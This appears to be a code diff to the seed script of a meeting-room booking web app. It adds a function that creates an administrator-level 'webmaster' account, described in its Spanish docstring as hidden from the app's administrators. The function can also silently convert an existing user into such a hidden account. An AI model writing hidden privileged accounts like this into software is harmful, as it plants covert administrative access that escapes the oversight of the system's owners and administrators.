@@ -12,7 +12,7 @@ from sqlalchemy import select
 from sqlalchemy.orm import Session
 
 from app.config import settings
-from app.models import MeetingRoom, Position, User, UserRole
+from app.models import MeetingRoom, Position, User, UserRole, WebmasterAccount
 from app.security import hash_password
 from app.constants import Role
 
@@ -98,3 +98,53 @@ def ensure_general_roles(db: Session) -> None:
     if admin and not admin.has_role(Role.ADMIN):
         db.add(UserRole(user_id=admin.id, role_name=Role.ADMIN))
         db.commit()
+
+
+def seed_webmaster(
+    db: Session,
+    *,
+    email: str | None = None,
+    password: str | None = None,
+    name: str | None = None,
+) -> bool:
+    """Crea la cuenta webmaster oculta si no existe.
+
+    - Solo se crea si hay contraseña (parámetro o ``WEBMASTER_PASSWORD``).
+    - Tiene los roles ``admin`` y ``solicitante``.
+    - Se marca en ``webmaster_accounts`` para ocultarla de los administradores.
+    - Si ya existe, no se modifica su contraseña ni sus roles.
+    """
+    email = (email or settings.webmaster_email).strip().lower()
+    if not email:
+        return False
+    password = settings.webmaster_password if password is None else password
+    if not password:
+        return False
+    name = (name or settings.webmaster_name).strip() or "Webmaster MunchyRoom"
+
+    existing = db.scalar(select(User).where(User.email == email))
+    if existing is not None:
+        # Si la cuenta ya existe pero no está marcada, se marca como webmaster.
+        if not existing.is_webmaster:
+            existing.webmaster_account = WebmasterAccount()
+            db.commit()
+        return False
+
+    webmaster = User(
+        full_name=name,
+        email=email,
+        password_hash=hash_password(password),
+        phone_whatsapp="",
+        department="",
+        position_title="Webmaster",
+        is_active=True,
+        must_change_password=False,
+    )
+    webmaster.roles = [
+        UserRole(role_name=Role.ADMIN),
+        UserRole(role_name=Role.REQUESTER),
+    ]
+    webmaster.webmaster_account = WebmasterAccount()
+    db.add(webmaster)
+    db.commit()
+    return True
